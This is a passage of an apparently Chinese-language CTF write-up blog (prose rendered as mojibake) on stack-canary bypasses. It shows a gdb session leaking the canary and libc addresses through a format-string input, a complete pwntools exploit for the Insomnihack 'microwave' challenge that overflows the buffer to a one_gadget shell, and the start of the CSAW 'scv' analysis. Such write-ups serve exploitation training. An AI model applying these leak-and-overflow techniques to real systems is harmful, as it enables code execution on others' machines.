class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">assassinq@ubuntu ~/pwn/ctf-wiki/canary/2016-insomnihack-microwave$ gdb ./microwave</span><br><span class="line">GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</span><br><span class="line">and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span><br><span class="line">Type &quot;show configuration&quot; for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</span><br><span class="line">Reading symbols from ./microwave...(no debugging symbols found)...done.</span><br><span class="line">assassinq&gt;&gt; set environment LD_LIBRARY_PATH=./libc.so.6</span><br><span class="line">assassinq&gt;&gt; r</span><br><span class="line">Starting program: /home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave </span><br><span class="line"></span><br><span class="line"> --------------------------------------------------------</span><br><span class="line"> |     Welcome to the next generation of MicroWaves!    |</span><br><span class="line"> |                         ***                          |</span><br><span class="line"> | This stylish Microwave with Grill function, includes |</span><br><span class="line"> |      a function that tweets your favourite food!     |</span><br><span class="line"> |                         ***                          |</span><br><span class="line"> --------------------------------------------------------</span><br><span class="line">           ----------------------------------</span><br><span class="line">           |  1. Connect to Twitter account |</span><br><span class="line">           |  2. Edit your tweet            |</span><br><span class="line">           |  3. Grill &amp; Tweet your food    |</span><br><span class="line">           |  q. Exit                       |</span><br><span class="line">           ----------------------------------</span><br><span class="line"></span><br><span class="line">           [MicroWave]: 1</span><br><span class="line"></span><br><span class="line">           Log in on Twitter:</span><br><span class="line">           username: %p.%p.%p.%p.%p.%p.%p.%p</span><br><span class="line">           password: n07_7h3_fl46</span><br><span class="line"></span><br><span class="line">Checking 0x7ffff7dd3780.0x7ffff7b042c0.0x7ffff7fd8700.0xa.(nil).0x82f154bf635c9900.0x7ffff7dd2708.0x7ffff7dd2710</span><br><span class="line">Twitter account</span><br><span class="line">............</span><br><span class="line">           ----------------------------------</span><br><span class="line">           |  1. Connect to Twitter account |</span><br><span class="line">           |  2. Edit your tweet            |</span><br><span class="line">           |  3. Grill &amp; Tweet your food    |</span><br><span class="line">           |  q. Exit                       |</span><br><span class="line">           ----------------------------------</span><br><span class="line"></span><br><span class="line">           [MicroWave]: ^C</span><br><span class="line">Program received signal SIGINT, Interrupt.</span><br><span class="line"></span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0xfffffffffffffe00 </span><br><span class="line">RBX: 0x7ffff7dd18e0 --&gt; 0xfbad2288 </span><br><span class="line">RCX: 0x7ffff7b04260 (&lt;__read_nocancel+7&gt;:cmp    rax,0xfffffffffffff001)</span><br><span class="line">RDX: 0x400 </span><br><span class="line">RSI: 0x555555759060 (&quot;n07_7h3_fl46\np.%p.%p.%p\n&quot;)</span><br><span class="line">RDI: 0x0 </span><br><span class="line">RBP: 0x7ffff7dd2620 --&gt; 0xfbad2887 </span><br><span class="line">RSP: 0x7fffffffda28 --&gt; 0x7ffff7a875e8 (&lt;_IO_new_file_underflow+328&gt;:cmp    rax,0x0)</span><br><span class="line">RIP: 0x7ffff7b04260 (&lt;__read_nocancel+7&gt;:cmp    rax,0xfffffffffffff001)</span><br><span class="line">R8 : 0x7ffff7dd3780 --&gt; 0x0 </span><br><span class="line">R9 : 0x7ffff7fd8700 (0x00007ffff7fd8700)</span><br><span class="line">R10: 0x7ffff7fd8700 (0x00007ffff7fd8700)</span><br><span class="line">R11: 0x246 </span><br><span class="line">R12: 0xa (&apos;\n&apos;)</span><br><span class="line">R13: 0x2 </span><br><span class="line">R14: 0x55555575906d (&quot;p.%p.%p.%p\n&quot;)</span><br><span class="line">R15: 0x7ffff7dd18e0 --&gt; 0xfbad2288</span><br><span class="line">EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x7ffff7b04257 &lt;read+7&gt;:jne    0x7ffff7b04269 &lt;read+25&gt;</span><br><span class="line">   0x7ffff7b04259 &lt;__read_nocancel&gt;:mov    eax,0x0</span><br><span class="line">   0x7ffff7b0425e &lt;__read_nocancel+5&gt;:syscall </span><br><span class="line">=&gt; 0x7ffff7b04260 &lt;__read_nocancel+7&gt;:cmp    rax,0xfffffffffffff001</span><br><span class="line">   0x7ffff7b04266 &lt;__read_nocancel+13&gt;:jae    0x7ffff7b04299 &lt;read+73&gt;</span><br><span class="line">   0x7ffff7b04268 &lt;__read_nocancel+15&gt;:ret    </span><br><span class="line">   0x7ffff7b04269 &lt;read+25&gt;:sub    rsp,0x8</span><br><span class="line">   0x7ffff7b0426d &lt;read+29&gt;:call   0x7ffff7b220d0 &lt;__libc_enable_asynccancel&gt;</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffda28 --&gt; 0x7ffff7a875e8 (&lt;_IO_new_file_underflow+328&gt;:cmp    rax,0x0)</span><br><span class="line">0008| 0x7fffffffda30 --&gt; 0x7ffff7dd26a3 --&gt; 0xdd3780000000000a </span><br><span class="line">0016| 0x7fffffffda38 --&gt; 0x7ffff7dd18e0 --&gt; 0xfbad2288 </span><br><span class="line">0024| 0x7fffffffda40 --&gt; 0x7fffffffdae0 --&gt; 0x7fffff000a31 </span><br><span class="line">0032| 0x7fffffffda48 --&gt; 0x7ffff7a8860e (&lt;__GI__IO_default_uflow+14&gt;:cmp    eax,0xffffffff)</span><br><span class="line">0040| 0x7fffffffda50 --&gt; 0x0 </span><br><span class="line">0048| 0x7fffffffda58 --&gt; 0x7ffff7a7bc6a (&lt;__GI__IO_getline_info+170&gt;:cmp    eax,0xffffffff)</span><br><span class="line">0056| 0x7fffffffda60 --&gt; 0x19 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGINT</span><br><span class="line">0x00007ffff7b04260 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84</span><br><span class="line">84../sysdeps/unix/syscall-template.S: No such file or directory.</span><br><span class="line">assassinq&gt;&gt; vmmap </span><br><span class="line">Start              End                PermName</span><br><span class="line">0x0000555555554000 0x0000555555557000 r-xp/home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave</span><br><span class="line">0x0000555555757000 0x0000555555758000 r--p/home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave</span><br><span class="line">0x0000555555758000 0x0000555555759000 rw-p/home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave</span><br><span class="line">0x0000555555759000 0x000055555577a000 rw-p[heap]</span><br><span class="line">0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7bcd000 0x00007ffff7dcd000 ---p/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dcd000 0x00007ffff7dd1000 r--p/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd3000 0x00007ffff7dd7000 rw-pmapped</span><br><span class="line">0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp/lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7fd7000 0x00007ffff7fda000 rw-pmapped</span><br><span class="line">0x00007ffff7ff7000 0x00007ffff7ffa000 r--p[vvar]</span><br><span class="line">0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp[vdso]</span><br><span class="line">0x00007ffff7ffc000 0x00007ffff7ffd000 r--p/lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p/lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffe000 0x00007ffff7fff000 rw-pmapped</span><br><span class="line">0x00007ffffffdd000 0x00007ffffffff000 rw-p[stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp[vsyscall]</span><br></pre></td></tr></table></figure><p>æœ€åæ”¾ä¸Šexpï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line"># context.log_level = &apos;debug&apos;</span><br><span class="line">context.arch = &apos;amd64&apos;</span><br><span class="line">local = 0</span><br><span class="line">if local:</span><br><span class="line">p = process(&apos;./microwave&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">libc_base_offset = 0xf72c0</span><br><span class="line">one_gadget_offset = 0x45216</span><br><span class="line">else:</span><br><span class="line">p = remote(&apos;127.0.0.1&apos;, 1337)</span><br><span class="line">libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line">libc_base_offset = 0xeb870</span><br><span class="line">one_gadget_offset = 0x464d8</span><br><span class="line">elf = ELF(&apos;./microwave&apos;)</span><br><span class="line">log.success(&apos;libc_base_offset = &apos; + hex(libc_base_offset))</span><br><span class="line">log.success(&apos;one_gadget_offset = &apos; + hex(one_gadget_offset))</span><br><span class="line"></span><br><span class="line">def connect(username, password):</span><br><span class="line">p.sendlineafter(&apos;[MicroWave]:&apos;, &apos;1&apos;)</span><br><span class="line">p.sendlineafter(&apos;username:&apos;, username)</span><br><span class="line">p.sendlineafter(&apos;password:&apos;, password)</span><br><span class="line"></span><br><span class="line">def edit(content):</span><br><span class="line">p.sendlineafter(&apos;[MicroWave]:&apos;, &apos;2&apos;)</span><br><span class="line">p.sendlineafter(&apos;#&gt;&apos;, content)</span><br><span class="line"></span><br><span class="line">def tweet():</span><br><span class="line">p.sendlineafter(&apos;[MicroWave]:&apos;, &apos;3&apos;)</span><br><span class="line"></span><br><span class="line">def quit():</span><br><span class="line">p.sendlineafter(&apos;[MicroWave]:&apos;, &apos;q&apos;)</span><br><span class="line"></span><br><span class="line"># gdb.attach(p)</span><br><span class="line">password = &apos;n07_7h3_fl46&apos;</span><br><span class="line">connect(&apos;%p.&apos; * 8, password)</span><br><span class="line">p.recvuntil(&apos;Checking&apos;)</span><br><span class="line">leak_data = p.recvline().strip().split(&apos;.&apos;)[:-1]</span><br><span class="line">print leak_data</span><br><span class="line">canary = int(leak_data[5][2:], 16)</span><br><span class="line">log.success(&apos;canary = &apos; + hex(canary))</span><br><span class="line">leak_libc = int(leak_data[1][2:], 16)</span><br><span class="line">log.success(&apos;leak_libc = &apos; + hex(leak_libc))</span><br><span class="line">libc_base = leak_libc - libc_base_offset</span><br><span class="line">log.success(&apos;libc_base = &apos; + hex(libc_base))</span><br><span class="line">one_gadget = libc_base + one_gadget_offset</span><br><span class="line">log.success(&apos;one_gadget = &apos; + hex(one_gadget))</span><br><span class="line">payload = flat([</span><br><span class="line">&apos;A&apos; * 1032, </span><br><span class="line">canary, </span><br><span class="line">&apos;B&apos; * 8, </span><br><span class="line">one_gadget</span><br><span class="line">])</span><br><span class="line">edit(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="2017-CSAW-Quals-scv"><a href="#2017-CSAW-Quals-scv" class="headerlink" title="2017-CSAW-Quals-scv"></a>2017-CSAW-Quals-scv</h3><p>å¼€äº†<code>Canary</code>ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/assassinq/pwn/ctf-wiki/canary/2017-CSAW-Quals-csv/scv&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>å°±åªæœ‰ä¸€ä¸ªmainå‡½æ•°ï¼Œç”±äºæ˜¯c++ç¨‹åºï¼Œçœ‹èµ·æ¥æœ‰ç‚¹æ··ä¹±ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax</span></span><br><span class="line">  __int64 v9; <span class="comment">// rax</span></span><br><span class="line">  __int64 v10; <span class="comment">// rax</span></span><br><span class="line">  __int64 v11; <span class="comment">// rax</span></span><br><span class="line">  __int64 v12; <span class="comment">// rax</span></span><br><span class="line">  __int64 v13; <span class="comment">// rax</span></span><br><span class="line">  __int64 v14; <span class="comment">// rax</span></span><br><span class="line">  __int64 v15; <span class="comment">// rax</span></span><br><span class="line">  __int64 v16; <span class="comment">// rax</span></span><br><span class="line">  __int64 v17; <span class="comment">// rax</span></span><br><span class="line">  __int64 v18; <span class="comment">// rax</span></span><br><span class="line">  __int64 v19; <span class="comment">// rax</span></span><br><span class="line">  __int64 v20; <span class="comment">// rax</span></span><br><span class="line">  __int64 v21; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> choice; <span class="comment">// [rsp+4h] [rbp-BCh]</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// [rsp+8h] [rbp-B8h]</span></span><br><span class="line">  <span class="keyword">int</span> v25; <span class="comment">// [rsp+Ch] [rbp-B4h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-B0h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v27; <span class="comment">// [rsp+B8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v27 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  choice = <span class="number">0</span>;</span><br><span class="line">  v24 = <span class="number">1</span>;</span><br><span class="line">  v25 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v24 )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"-------------------------"</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    v4 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"[*]SCV GOOD TO GO,SIR...."</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    v5 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"-------------------------"</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v5, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    v6 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"1.FEED SCV...."</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v6, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    v7 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"2.REVIEW THE FOOD...."</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v7, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    v8 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"3.MINE MINERALS...."</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v8, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    v9 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"-------------------------"</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v9, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"&gt;&gt;"</span>);</span><br><span class="line">    <span class="built_in">std</span>::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;choice);</span><br><span class="line">    <span class="keyword">switch</span> ( choice )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:                                   <span class="comment">// show</span></span><br><span class="line">        v15 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"-------------------------"</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v15, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        v16 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"[*]REVIEW THE FOOD..........."</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v16, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        v17 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"-------------------------"</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v17, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        v18 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"[*]PLEASE TREAT HIM WELL....."</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v18, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        v19 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"-------------------------"</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v19, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        <span class="built_in">puts</span>(&amp;buf);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:                                   <span class="comment">// exit</span></span><br><span class="line">        v24 = <span class="number">0</span>;</span><br><span class="line">        v20 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"[*]BYE ~ TIME TO MINE MIENRALS..."</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v20, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:                                   <span class="comment">// edit</span></span><br><span class="line">        v10 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"-------------------------"</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v10, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        v11 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"[*]SCV IS ALWAYS HUNGRY....."</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v11, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        v12 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"-------------------------"</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v12, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        v13 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"[*]GIVE HIM SOME FOOD......."</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v13, &amp;<span class="built_in">std</span>::<span 